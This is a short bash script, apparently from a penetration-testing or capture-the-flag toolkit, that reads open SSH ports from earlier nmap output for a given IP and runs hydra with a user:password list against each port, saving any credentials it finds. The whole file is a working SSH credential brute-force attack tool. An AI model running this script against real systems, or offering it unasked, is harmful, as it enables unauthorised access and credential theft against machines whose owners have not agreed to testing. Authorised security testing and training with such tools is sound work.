#!/bin/bash

if [ -z "$1" ]; then
	echo Usage: $0 ip 
	exit
fi


USERPASS=$PWD/user-pass
DIRECTORY=$PWD/nmap-results/$1

if [ ! -d "$DIRECTORY/ssh" ]; then
	mkdir -p $DIRECTORY/ssh
fi

echo "##############################################################################"
echo "ENUMRATE SSH $1"
echo "##############################################################################"
for ssh_port in $(grep ssh $DIRECTORY/tcp.nmap | grep open | cut -d" " -f1 | cut -d"/" -f1) ;do



	echo "[*]RUN hydra on $1:$ssh_port"
	hydra -vV -f -C $USERPASS -o $DIRECTORY/ssh/found_cred_$ssh_port ssh://$1 -s $ssh_port
 	echo
	echo
	
done


echo Done
read